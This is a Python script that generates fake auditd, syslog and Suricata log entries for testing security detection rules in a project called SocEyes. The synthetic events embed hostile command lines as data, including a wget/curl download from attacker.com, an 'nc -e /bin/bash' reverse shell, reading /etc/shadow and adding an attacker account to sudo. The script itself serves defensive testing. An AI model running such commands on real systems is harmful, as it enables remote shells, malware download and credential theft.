#!/usr/bin/env python3
"""
Fake Attack Generator for SocEyes

This script generates realistic fake attacks that will be detected by:
- Wazuh (Linux auditd rules)
- Elasticsearch (detection rules)
- Sigma rules
- Suricata (network-based detections)

Generated logs are written to:
- ingest/auditd/audit.log (for Linux auditd events)
- ingest/syslog/syslog.log (for syslog events)
- ingest/json/alerts.json (for JSON alerts)
- ingest/suricata/alerts.json (for network events)
"""

import json
import time
import random
import argparse
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any
from enum import Enum


class AttackType(Enum):
    """Types of attacks that can be generated."""
    DISCOVERY = "discovery"
    CREDENTIAL_ACCESS = "credential_access"
    LATERAL_MOVEMENT = "lateral_movement"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    NETWORK_RECON = "network_recon"
    SSH_BRUTE_FORCE = "ssh_brute_force"
    SUDO_EXECUTION = "sudo_execution"


class FakeAttackGenerator:
    """Generate fake attacks for detection testing."""

    # Relative to the repository root so the same default works inside the
    # containers (WORKDIR=/workspace) and on a developer's machine.
    def __init__(self, output_dir: str = "ingest"):
        """Initialize the generator with output directory."""
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Ensure subdirectories exist
        (self.output_dir / "auditd").mkdir(exist_ok=True)
        (self.output_dir / "syslog").mkdir(exist_ok=True)
        (self.output_dir / "json").mkdir(exist_ok=True)
        (self.output_dir / "suricata").mkdir(exist_ok=True)
        
        self.start_time = int(time.time())
        self.sequence_counter = 0

    def _get_timestamp(self) -> tuple[int, int]:
        """Generate timestamp in auditd format: timestamp.milliseconds and sequence."""
        self.sequence_counter += 1
        timestamp = self.start_time + (self.sequence_counter // 1000)
        milliseconds = (self.sequence_counter % 1000)
        return timestamp, milliseconds

    def _generate_auditd_event(
        self,
        event_type: str,
        event_id: int,
        fields: Dict[str, str]
    ) -> str:
        """Generate an auditd event line."""
        timestamp, ms = self._get_timestamp()

        field_str = " ".join(f"{k}=\"{v}\"" if " " in v else f"{k}={v}" 
                            for k, v in fields.items())
        
        return f'type={event_type} msg=audit({timestamp}.{ms:03d}:{event_id}): {field_str}'

    def generate_discovery_attacks(self, count: int = 10) -> List[str]:
        """Generate discovery/reconnaissance attacks (T1082, T1518)."""
        logs = []
        commands = ["uname", "uptime", "lsmod", "hostname", "env", "kmod"]
        
        for i in range(count):
            cmd = random.choice(commands)
            event_id = 100500 + i
            
            if cmd in ["passwd", "chage"]:
                fields = {"argc": "2", "a0": f'"{cmd}"', "a1": '"-l"'}
            else:
                fields = {"argc": "1", "a0": f'"{cmd}"'}
            
            log = self._generate_auditd_event("EXECVE", event_id, fields)
            logs.append(log)
        
        return logs

    def generate_credential_access_attacks(self, count: int = 10) -> List[str]:
        """Generate credential access attacks (passwd, sudo)."""
        logs = []
        commands = ["passwd", "chage", "shadow", "sudoedit"]
        
        for i in range(count):
            cmd = random.choice(commands)
            event_id = 101000 + i
            
            fields = {"argc": "2", "a0": f'"{cmd}"', "a1": '"-l"'}
            log = self._generate_auditd_event("EXECVE", event_id, fields)
            logs.append(log)
        
        return logs

    def generate_execution_attacks(self, count: int = 10) -> List[str]:
        """Generate execution attacks (suspicious command execution)."""
        logs = []
        commands = [
            "bash", "sh", "curl", "wget", "perl", "python", "ruby",
            "python3", "nc", "netcat", "telnet"
        ]
        
        for i in range(count):
            cmd = random.choice(commands)
            event_id = 101500 + i
            
            # Some commands with arguments
            args = []
            if cmd in ["curl", "wget"]:
                args = ['-O', 'http://attacker.com/malware.sh']
            elif cmd in ["python", "python3"]:
                args = ['-c', '"import socket; s=socket.socket()"']
            elif cmd == "nc":
                args = ['-e', '/bin/bash', '10.0.0.1', '4444']
            
            argc = len(args) + 1
            fields = {"argc": str(argc), "a0": f'"{cmd}"'}
            for idx, arg in enumerate(args):
                fields[f"a{idx+1}"] = f'"{arg}"'
            
            log = self._generate_auditd_event("EXECVE", event_id, fields)
            logs.append(log)
        
        return logs

    def generate_privilege_escalation_attacks(self, count: int = 10) -> List[str]:
        """Generate privilege escalation attempts."""
        logs = []
        sudo_commands = [
            "su -",
            "sudo -i",
            "sudo -s",
            "sudo su",
            "sudo /bin/bash",
            "sudo /bin/sh"
        ]
        
        for i in range(count):
            cmd = random.choice(sudo_commands)
            event_id = 102000 + i
            parts = cmd.split()
            
            argc = len(parts)
            fields = {"argc": str(argc)}
            for idx, part in enumerate(parts):
                fields[f"a{idx}"] = f'"{part}"'
            
            log = self._generate_auditd_event("EXECVE", event_id, fields)
            logs.append(log)
        
        return logs

    def generate_ssh_brute_force(self, count: int = 20) -> List[str]:
        """Generate SSH failed login attempts (syslog format)."""
        logs = []
        usernames = ["root", "admin", "user", "oracle", "postgres", "test"]
        
        for i in range(count):
            timestamp = datetime.fromtimestamp(self.start_time + i)
            ts_str = timestamp.strftime("%b %d %H:%M:%S")
            username = random.choice(usernames)
            src_ip = f"192.168.1.{random.randint(1, 254)}"
            
            log = f"{ts_str} localhost sshd[{1000+i}]: Failed password for {username} from {src_ip} port {random.randint(10000, 60000)} ssh2"
            logs.append(log)
        
        return logs

    def generate_sudo_execution(self, count: int = 10) -> List[str]:
        """Generate sudo command execution logs."""
        logs = []
        commands = ["cat /etc/shadow", "vi /etc/sudoers", "adduser attacker", "usermod -G sudo attacker"]
        users = ["attacker", "compromised_user", "webserver"]
        
        for i in range(count):
            timestamp = datetime.fromtimestamp(self.start_time + i)
            ts_str = timestamp.strftime("%b %d %H:%M:%S")
            user = random.choice(users)
            cmd = random.choice(commands)
            
            log = f"{ts_str} localhost sudo: {user} : TTY=pts/{i % 4} ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"
            logs.append(log)
        
        return logs

    def generate_network_alerts(self, count: int = 10) -> List[Dict[str, Any]]:
        """Generate Suricata network alerts."""
        alerts = []
        
        attack_signatures = [
            {
                "msg": "ET POLICY SSH Inbound Connection on Common SSH Port",
                "port": 22,
                "sid": 2000001
            },
            {
                "msg": "ET POLICY HTTP Traffic on Uncommon Port",
                "port": random.choice([8080, 8443, 3128]),
                "sid": 2000002
            },
            {
                "msg": "SURICATA DNSSEC Invalid Header",
                "port": 53,
                "sid": 2000003
            },
            {
                "msg": "Possible SQL Injection Attempt",
                "port": 3306,
                "sid": 2000004
            },
            {
                "msg": "SMB Exploit Attempt",
                "port": 445,
                "sid": 2000005
            }
        ]
        
        for i in range(count):
            attack = random.choice(attack_signatures)
            timestamp = datetime.fromtimestamp(self.start_time + i).isoformat()
            src_ip = f"192.168.1.{random.randint(1, 254)}"
            dest_ip = f"10.0.0.{random.randint(1, 254)}"
            
            alert = {
                "timestamp": timestamp,
                "flow_id": 1000000000000 + i,
                "event_type": "alert",
                "src_ip": src_ip,
                "src_port": random.randint(10000, 60000),
                "dest_ip": dest_ip,
                "dest_port": attack["port"],
                "proto": "TCP",
                "alert": {
                    "action": "allowed",
                    "gid": 1,
                    "signature_id": attack["sid"],
                    "signature": attack["msg"],
                    "category": "Suspicious Activity",
                    "severity": random.randint(1, 3)
                },
                "http": {
                    "hostname": "attacker.com",
                    "url": f"/payload?cmd={i}",
                    "http_user_agent": "curl/7.64.1",
                    "http_content_type": "text/plain"
                } if random.random() > 0.5 else None,
                "payload": f"Attack payload #{i}"
            }
            alerts.append(alert)
        
        return alerts

    def write_auditd_logs(self, logs: List[str]) -> Path:
        """Write logs to audit.log."""
        log_file = self.output_dir / "auditd" / "audit.log"
        with open(log_file, "a") as f:
            for log in logs:
                f.write(log + "\n")
        return log_file

    def write_syslog_logs(self, logs: List[str]) -> Path:
        """Write logs to syslog.log."""
        log_file = self.output_dir / "syslog" / "syslog.log"
        with open(log_file, "a") as f:
            for log in logs:
                f.write(log + "\n")
        return log_file

    def write_network_alerts(self, alerts: List[Dict[str, Any]]) -> Path:
        """Write Suricata alerts to JSON."""
        log_file = self.output_dir / "suricata" / "alerts.json"
        
        # Read existing content if file exists
        existing = []
        if log_file.exists():
            with open(log_file, "r") as f:
                existing = [json.loads(line) for line in f if line.strip()]
        
        # Write all alerts
        with open(log_file, "w") as f:
            for alert in existing + alerts:
                f.write(json.dumps(alert) + "\n")
        
        return log_file

    def generate_all(self, count_per_type: int = 10) -> Dict[str, List[str]]:
        """Generate all attack types and write to files."""
        results = {}
        
        # Generate and write auditd logs
        print(f"[*] Generating {count_per_type} discovery attacks...")
        discovery = self.generate_discovery_attacks(count_per_type)
        results["discovery"] = discovery
        
        print(f"[*] Generating {count_per_type} credential access attacks...")
        cred = self.generate_credential_access_attacks(count_per_type)
        results["credential_access"] = cred
        
        print(f"[*] Generating {count_per_type} execution attacks...")
        exec_attacks = self.generate_execution_attacks(count_per_type)
        results["execution"] = exec_attacks
        
        print(f"[*] Generating {count_per_type} privilege escalation attacks...")
        privesc = self.generate_privilege_escalation_attacks(count_per_type)
        results["privilege_escalation"] = privesc
        
        # Write auditd logs
        all_auditd = discovery + cred + exec_attacks + privesc
        self.write_auditd_logs(all_auditd)
        print(f"[+] Wrote {len(all_auditd)} auditd events to ingest/auditd/audit.log")
        
        # Generate and write syslog logs
        print(f"[*] Generating {count_per_type*2} SSH brute force attempts...")
        ssh_brute = self.generate_ssh_brute_force(count_per_type * 2)
        results["ssh_brute_force"] = ssh_brute
        
        print(f"[*] Generating {count_per_type} sudo execution logs...")
        sudo_exec = self.generate_sudo_execution(count_per_type)
        results["sudo_execution"] = sudo_exec
        
        # Write syslog logs
        all_syslog = ssh_brute + sudo_exec
        self.write_syslog_logs(all_syslog)
        print(f"[+] Wrote {len(all_syslog)} syslog events to ingest/syslog/syslog.log")
        
        # Generate and write network alerts
        print(f"[*] Generating {count_per_type} network alerts...")
        network = self.generate_network_alerts(count_per_type)
        results["network"] = network
        self.write_network_alerts(network)
        print(f"[+] Wrote {len(network)} network alerts to ingest/suricata/alerts.json")
        
        return results

    def generate_by_type(self, attack_type: AttackType, count: int = 10) -> List[str]:
        """Generate attacks of a specific type."""
        generators = {
            AttackType.DISCOVERY: self.generate_discovery_attacks,
            AttackType.CREDENTIAL_ACCESS: self.generate_credential_access_attacks,
            AttackType.EXECUTION: self.generate_execution_attacks,
            AttackType.PRIVILEGE_ESCALATION: self.generate_privilege_escalation_attacks,
            AttackType.SSH_BRUTE_FORCE: self.generate_ssh_brute_force,
            AttackType.SUDO_EXECUTION: self.generate_sudo_execution,
        }
        
        if attack_type not in generators:
            raise ValueError(f"Unknown attack type: {attack_type}")
        
        return generators[attack_type](count)


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Generate fake attacks for SocEyes testing"
    )
    parser.add_argument(
        "--type",
        choices=[t.value for t in AttackType],
        help="Specific attack type to generate (default: all)"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=10,
        help="Number of attacks per type (default: 10)"
    )
    parser.add_argument(
        "--output-dir",
        default="ingest",
        help="Output directory for logs (default: ./ingest)"
    )
    parser.add_argument(
        "--clear",
        action="store_true",
        help="Clear existing logs before generating new ones"
    )
    
    args = parser.parse_args()
    
    generator = FakeAttackGenerator(args.output_dir)
    
    if args.clear:
        print("[*] Clearing existing logs...")
        for log_file in [
            generator.output_dir / "auditd" / "audit.log",
            generator.output_dir / "syslog" / "syslog.log",
            generator.output_dir / "suricata" / "alerts.json"
        ]:
            if log_file.exists():
                log_file.unlink()
                print(f"[+] Cleared {log_file}")
    
    if args.type:
        attack_type = AttackType(args.type)
        print(f"[*] Generating {args.count} {attack_type.value} attacks...")
        logs = generator.generate_by_type(attack_type, args.count)
        
        # Write appropriate file type
        if attack_type in [AttackType.SSH_BRUTE_FORCE, AttackType.SUDO_EXECUTION]:
            generator.write_syslog_logs(logs)
            print(f"[+] Wrote {len(logs)} logs to ingest/syslog/syslog.log")
        else:
            generator.write_auditd_logs(logs)
            print(f"[+] Wrote {len(logs)} logs to ingest/auditd/audit.log")
    else:
        print("[*] Generating all attack types...")
        generator.generate_all(args.count)
    
    print("\n[+] Attack generation complete!")
    print("[+] Check ingest/ directory for generated logs")


if __name__ == "__main__":
    main()
